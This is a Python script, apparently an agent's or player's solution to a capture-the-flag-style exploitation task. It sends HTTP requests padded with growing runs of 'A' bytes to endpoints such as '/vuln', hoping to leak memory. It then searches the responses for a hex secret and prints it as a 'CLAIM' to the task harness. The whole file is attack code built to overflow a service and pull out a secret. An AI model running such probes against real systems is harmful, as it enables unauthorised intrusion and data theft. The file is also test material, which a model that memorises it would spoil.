import sys, json, base64, binascii, time

def send_http(method, path, body_hex=None, headers=None):
    req = {"http": {"method": method, "path": path}}
    if body_hex is not None:
        req["http"]["body_hex"] = body_hex
    if headers:
        req["http"]["headers"] = headers
    print(json.dumps(req), flush=True)
    # read one line response
    line = sys.stdin.readline()
    if not line:
        sys.exit(0)
    resp = json.loads(line)
    return resp

def try_payload(path, size):
    # create payload of 'A's
    payload = b"A" * size
    body_hex = payload.hex()
    resp = send_http("GET", path, body_hex=body_hex)
    body = base64.b64decode(resp.get("body_b64", ""))
    return resp, body

def find_secret_in(data):
    # look for hex strings of length >= 32 chars (16 bytes) in ascii representation
    try:
        txt = data.decode('utf-8', errors='ignore')
    except Exception:
        return None
    import re
    # pattern of hex characters at least 32 length
    for m in re.finditer(r"[0-9a-fA-F]{32,}", txt):
        hexstr = m.group(0)
        # verify even length
        if len(hexstr) % 2 == 0:
            try:
                _ = binascii.unhexlify(hexstr)
                return hexstr
            except Exception:
                continue
    return None

def main():
    # read provision (unused)
    if len(sys.argv) > 1:
        prov = json.loads(sys.argv[1])
    else:
        prov = {}
    paths = ["/", "/parse", "/record", "/vuln"]
    # try increasing sizes
    for path in paths:
        for size in [64, 128, 256, 512, 1024, 2048, 4096]:
            resp, body = try_payload(path, size)
            secret = find_secret_in(body)
            if secret:
                # output claim
                claim = {"secret_hex": secret.lower()}
                print(f"CLAIM:{json.dumps(claim)}")
                return
    # if not found, just claim empty (will be wrong)
    print('CLAIM:' + json.dumps({"secret_hex": ""}))

if __name__ == "__main__":
    main()